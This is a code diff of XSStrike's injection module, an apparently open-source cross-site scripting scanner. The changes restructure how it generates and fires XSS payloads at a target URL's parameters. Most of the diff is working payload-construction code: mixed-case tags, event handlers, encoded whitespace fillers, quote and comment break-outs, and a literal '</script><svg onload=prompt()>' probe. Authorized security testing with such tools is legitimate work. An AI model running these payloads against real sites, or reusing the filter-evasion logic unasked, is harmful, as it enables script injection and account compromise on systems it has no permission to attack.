@@ -1,12 +1,12 @@
 import sys
-from urllib.parse import quote_plus
+import random
+try:
+    from urllib.parse import quote_plus
+except:
+    print ('\033[91m[-]\033[0m XSStrike isn\'t compatible with python2. Run it with python3 i.e. \033[7;92mpython3 xsstrike\033[0m')
+    quit()
 from core.which_quote import which_quote
 from core.test_param_check import test_param_check
-try:
-    from builtins import zip # To iterate over multiple lists simultaneously
-except:
-    print ('\033[91m[-]\033[0m XSStrike isn\'t compatible with python3. Run it with python3 i.e. \033[7;92mpython3 xsstrike\033[0m')
-    quit()
 
 tags = ['sVg', 'iMg', 'bOdY', 'd3v', 'deTails'] # HTML Tags
 
@@ -42,7 +42,7 @@ def inject(url, param_data, method, occur_number, occur_location):
     special = ''
     l_filling = ''
     e_fillings = ['%0a','%09','%0d','+'] # "Things" to use between event handler and = or between function and =
-    fillings = ['%0c', '%0a','%09','%0d','/+/'] # "Things" to use instead of space
+    fillings = ['%0a','%09','%0d','/+/'] # "Things" to use instead of space
     
     for OCCURENCE_NUM, location in zip(occur_number, occur_location):
         print('\n%s Testing reflection no. %s ' % (run, OCCURENCE_NUM))
@@ -68,94 +68,22 @@ def inject(url, param_data, method, occur_number, occur_location):
             single_allowed = False
             print('%s Single Quotes (\') are not allowed.' % bad)
         
-        if test_param_check('<lol>', '<lol>', OCCURENCE_NUM, url, param_data, method, action='nope'):
+        if test_param_check('<lol', '<lol', OCCURENCE_NUM, url, param_data, method, action='nope'):
             print('%s Angular Brackets (<>) are allowed.' % good)
             angular_allowed = True
             allowed.extend(('<', '>'))
         else:
             angular_allowed = False
             print('%s Angular Brackets (<>) are not allowed.' % bad)
-        
-        if location == 'comment':
-            print('%s Trying to break out of %sHTML Comment%s context.' % (run, green, end))
-            prefix = '-->'
-            suffixes = ['', '<!--']
-            progress = 1
-            for suffix in suffixes:
-                for tag in tags:
-                    for event_handler, compatible in list(event_handlers.items()):
-                        if tag in compatible:
-                            for filling, function, e_filling in zip(fillings, functions, e_fillings):
-                                progress = progress + 1
-                                sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                                sys.stdout.flush()
-                                if event_handler == 'oNeRror':
-                                    payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                else:
-                                    payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
-                                test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
-            print('')
-        elif location == 'script':
-            print('%s Trying to break out of %sJavaScript%s context.' % (run, green, end))
-            quote = which_quote(OCCURENCE_NUM, url, param_data, method)
-            if quote == None or quote == '':
-                quote = ''
-            prefixes = ['%s-' % quote, '\\%s-' % quote, '\\%s-' % quote]
-            suffixes = ['-%s' % quote, '-\\%s' % quote, '//%s' % quote]
-            progress = 0
-            for prefix, suffix in zip(prefixes, suffixes):
-                for function in functions:
-                    progress = progress + 1
-                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                    sys.stdout.flush()
-                    payload = prefix + function + suffix
-                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
-            test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url, param_data, method, action='do')
-        
-        elif location == 'html':
-            print('%s Trying to break out of %sPlaintext%s context.' % (run, green, end))
-            progress = 0
-            l_than, g_than = '', ''
-            if angular_allowed:
-                l_than, g_than = '<', '>'
-            else:
-                print('%s Angular brackets are being filtered. Unable to generate payloads.' % bad)
-                continue
-            for tag in tags:
-                for event_handler, compatible in list(event_handlers.items()):
-                    if tag in compatible:
-                        for filling, function, e_filling in zip(fillings, functions, e_fillings):
-                            progress = progress + 1
-                            sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                            sys.stdout.flush()
-                            if event_handler == 'oNeRror':
-                                payload = '%s%s%s%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, g_than)
-                            elif tag == 'd3v':
-                                payload = '%s%s%s%s%s%s=%s%s%s%sthis' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
-                            else:
-                                payload = '%s%s%s%s%s%s=%s%s%s%s' % (l_than, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
-                            test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
 
-        elif location == 'attribute':
-            print('%s Trying to break out of %sAttribute%s context.' % (run, green, end))
-            quote = which_quote(OCCURENCE_NUM, url, param_data, method)
-            
-            if quote == '':
-                prefix = '/>'
-                suffixes = ['<"', '<\'', '<br attr\'=', '<br attr="']
-            
-            elif quote in allowed:
-                prefix = '%s>' % quote
-                suffixes = ['<%s' % quote, '<br attr=%s' % quote]
-                progress = 0
-                for e_filling, function in zip(e_fillings, functions):
-                    payload = '%saUTofOCus/oNfoCus%s=%s%s%s' % (quote, e_filling, e_filling, quote, function)
-                    test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
-                    progress = progress + 1
-                    sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
-                    sys.stdout.flush()
-                sys.stdout.flush()
-                progress = progress + 1
+        if len(allowed) == 0:
+            print ('%s This parameter is properly sanitized.' % bad)
+        else:
+            if location == 'comment':
+                print('%s Trying to break out of %sHTML Comment%s context.' % (run, green, end))
+                prefix = '-->'
+                suffixes = ['', '<!--']
+                progress = 1
                 for suffix in suffixes:
                     for tag in tags:
                         for event_handler, compatible in list(event_handlers.items()):
@@ -170,5 +98,78 @@ def inject(url, param_data, method, occur_number, occur_location):
                                         payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
                                     test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
                 print('')
-            else:
-                print('%s Quotes are being filtered, its not possible to break out of the context.' % bad)
+            elif location == 'script':
+                print('%s Trying to break out of %sJavaScript%s context.' % (run, green, end))
+                quote = which_quote(OCCURENCE_NUM, url, param_data, method)
+                if quote == None or quote == '':
+                    quote = ''
+                prefixes = ['%s-' % quote, '\\%s-' % quote, '\\%s-' % quote]
+                suffixes = ['-%s' % quote, '-\\%s' % quote, '//%s' % quote]
+                progress = 0
+                for prefix, suffix in zip(prefixes, suffixes):
+                    for function in functions:
+                        progress = progress + 1
+                        sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
+                        sys.stdout.flush()
+                        payload = prefix + function + suffix
+                        test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
+                test_param_check(quote_plus('</script><svg onload=prompt()>'), '</script><svg onload=prompt()>', OCCURENCE_NUM, url, param_data, method, action='do')
+            
+            elif location == 'html':
+                print('%s Trying to break out of %sPlaintext%s context.' % (run, green, end))
+                progress = 0
+                if not angular_allowed:
+                    print('%s Angular brackets are being filtered. Unable to generate payloads.' % bad)
+                    continue
+                for tag in tags:
+                    for event_handler, compatible in list(event_handlers.items()):
+                        if tag in compatible:
+                            for filling, function, e_filling in zip(fillings, functions, e_fillings):
+                                progress = progress + 1
+                                sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
+                                sys.stdout.flush()
+                                g_than = random.choice(['>', '//'])
+                                if event_handler == 'oNeRror':
+                                    payload = '<%s%s%s%s%s%s%s%s=%s%s%s%s' % (tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, g_than)
+                                elif tag == 'd3v':
+                                    payload = '<%s%s%s%s%s=%s%s%s%sthis' % (tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
+                                else:
+                                    payload = '<%s%s%s%s%s=%s%s%s%s' % (tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, g_than)
+                                test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
+
+            elif location == 'attribute':
+                print('%s Trying to break out of %sAttribute%s context.' % (run, green, end))
+                quote = which_quote(OCCURENCE_NUM, url, param_data, method)
+                
+                if quote == '':
+                    prefix = '/>'
+                    suffixes = ['<"', '<\'', '<br attr\'=', '<br attr="']
+                
+                elif quote in allowed:
+                    prefix = '%s>' % quote
+                    suffixes = ['<%s' % quote, '<br attr=%s' % quote]
+                    progress = 0
+                    for e_filling, function in zip(e_fillings, functions):
+                        payload = '%saUTofOCus/oNfoCus%s=%s%s%s' % (quote, e_filling, e_filling, quote, function)
+                        test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
+                        progress = progress + 1
+                        sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
+                        sys.stdout.flush()
+                    sys.stdout.flush()
+                    progress = progress + 1
+                    for suffix in suffixes:
+                        for tag in tags:
+                            for event_handler, compatible in list(event_handlers.items()):
+                                if tag in compatible:
+                                    for filling, function, e_filling in zip(fillings, functions, e_fillings):
+                                        progress = progress + 1
+                                        sys.stdout.write('\r%s Payloads tried: %i' % (run, progress))
+                                        sys.stdout.flush()
+                                        if event_handler == 'oNeRror':
+                                            payload = '%s<%s%s%s%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, 'sRc=', e_filling, '=', e_filling, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                        else:
+                                            payload = '%s<%s%s%s%s%s=%s%s%s>%s' % (prefix, tag, filling, special, event_handler, e_filling, e_filling, function, l_filling, suffix)
+                                        test_param_check(quote_plus(payload), payload, OCCURENCE_NUM, url, param_data, method, action='do')
+                    print('')
+                else:
+                    print('%s Quotes are being filtered, its not possible to break out of the context.' % bad)
